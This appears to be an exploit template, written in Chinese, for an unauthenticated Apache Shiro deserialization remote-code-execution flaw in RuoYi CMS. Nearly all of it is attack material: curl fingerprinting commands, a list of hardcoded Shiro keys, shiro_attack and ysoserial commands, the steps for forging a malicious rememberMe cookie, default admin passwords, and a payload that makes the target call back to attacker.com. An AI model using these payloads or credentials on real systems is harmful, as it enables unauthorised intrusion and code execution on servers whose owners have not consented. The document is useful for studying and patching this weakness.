---
id: RUOYI-SHIRO-DESER
title: 若依CMS Shiro反序列化远程代码执行漏洞
product: ruoyi
vendor: 若依
version_affected: "v4.x, v3.x"
severity: CRITICAL
tags: [rce, deserialization, shiro, 国产, cms, 无需认证]
fingerprint: ["若依", "RuoYi", "ruoyi", "rememberMe", "ry.ruoyi"]
---

## 漏洞描述

若依CMS使用Apache Shiro进行身份认证，默认使用硬编码的密钥，导致反序列化RCE。

## 影响版本

- 若依CMS v4.x
- 若依CMS v3.x

## 前置条件

- 目标运行若依CMS 且可通过网络访问
- 目标使用 Shiro 默认密钥（未修改硬编码密钥）
- 无需认证

## 利用步骤

### Step 1: 确认Shiro

```bash
curl -v http://target/login 2>&1 | grep "rememberMe"
# 响应头包含: Set-Cookie: rememberMe=deleteMe
```

### Step 2: 已知密钥列表

若依常见Shiro密钥:
- `kPH+bIxk5D2deZiIxcaaaA==` (Shiro框架默认)
- `fCq+/xW488hMTCD+cmJ3aQ==` (若依历史版本)
- `zSyK5Kp6PZAAjlT+eeNMlg==` (部分版本)

### Step 3: 利用工具

```bash
# 使用 shiro_attack 工具
java -jar shiro_attack.jar -u http://target -k kPH+bIxk5D2deZiIxcaaaA==
```

### Step 4: 手动利用

使用 ysoserial 生成payload:
```bash
java -jar ysoserial.jar CommonsBeanutils1 "whoami" > payload.bin
# 用Shiro密钥AES加密payload
# 设置Cookie: rememberMe=<base64_encrypted_payload>
```

### 默认后台凭据

- `admin` / `admin123`
- `ry` / `admin123`

## Payload

### 确认 Shiro 框架

```bash
curl -s -v "http://target/login" 2>&1 | grep "rememberMe=deleteMe"
```

### 利用默认密钥发送序列化 payload

```bash
# 使用 shiro_attack 工具（密钥: kPH+bIxk5D2deZiIxcaaaA==）
java -jar shiro_attack.jar -u http://target -k kPH+bIxk5D2deZiIxcaaaA==
```

### 手动构造 Cookie payload

```bash
# 1. 生成序列化数据
java -jar ysoserial.jar CommonsBeanutils1 "curl http://attacker.com/callback" > payload.bin
# 2. AES加密 + Base64编码（密钥: kPH+bIxk5D2deZiIxcaaaA==）
# 3. 发送恶意 Cookie
curl -s "http://target/" -b "rememberMe=<base64_aes_encrypted_payload>"
```

## 验证方法

- 发送任意无效 `rememberMe` Cookie 后响应中包含 `rememberMe=deleteMe` 即确认使用 Shiro
- 使用默认密钥 `kPH+bIxk5D2deZiIxcaaaA==` 发送 payload 后，attacker.com 收到回连请求即确认 RCE

```bash
# 确认 Shiro
curl -s -v "http://target/login" -b "rememberMe=test" 2>&1 | grep "rememberMe=deleteMe"
```

## 指纹确认

```bash
curl -s http://target/ | grep -i "ruoyi\|若依"
curl -v http://target/login 2>&1 | grep -i "rememberMe"
```
